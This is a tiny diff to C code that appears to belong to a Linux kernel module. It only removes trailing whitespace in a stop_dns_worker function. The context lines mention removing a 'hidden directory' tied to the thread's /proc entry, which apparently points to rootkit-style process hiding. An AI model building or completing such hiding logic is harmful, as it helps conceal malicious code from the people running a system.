@@ -76,7 +76,7 @@ int start_dns_worker(void) {
 int stop_dns_worker(void) {
     if (!dns_worker_thread || IS_ERR(dns_worker_thread))
         return -EINVAL;
-    
+
     // Remove the hidden directory associated with the thread
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", dns_worker_thread->pid);
